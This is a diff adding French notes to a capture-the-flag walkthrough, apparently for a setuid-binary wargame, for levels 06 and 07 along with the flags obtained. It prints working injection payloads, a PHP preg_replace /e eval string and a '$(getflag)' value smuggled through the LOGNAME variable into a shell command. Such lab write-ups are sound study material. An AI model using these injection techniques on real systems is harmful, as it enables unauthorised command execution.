@@ -230,3 +230,65 @@ flag: viuaaale9huek52boumoomioc
 -------------
 
 level06
+
+ls -la 
+
+```c
+-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
+```
+
+j'ai cat le fichier php
+
+on a compris que le code permet de lancer une fonction avec le /e
+
+```c
+$a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+```
+
+donc 
+
+```c
+echo '[x ${`getflag`}]' >> /tmp/test.txt
+```
+
+puis j'ai lancer executable. 
+
+flag: wiok45aaoguiboiki2tuin6ub
+
+
+---------------------------------
+level07
+
+
+ls -la 
+c'est un execulatable 
+
+j'ai executer cette comande dans un terminal neutre 
+```c
+scp -P 4242 level07@10.11.248.91:/home/user/level07/level07 ~/Desktop/
+```
+
+puis je l'ai fais decrypter sur dogbolt.
+
+
+```c
+asprintf(&cmd, "/bin/echo %s ", getenv("LOGNAME"));
+```
+
+cela veut dire qu'il execute ce qu'il y dans getenv
+donc je change la variable d'environnement
+je lui dis d'executer getflag 
+
+```c
+export LOGNAME='$(getflag)'
+```
+apres je lance le script
+
+-----
+level 08
+
+
+
+
+
+
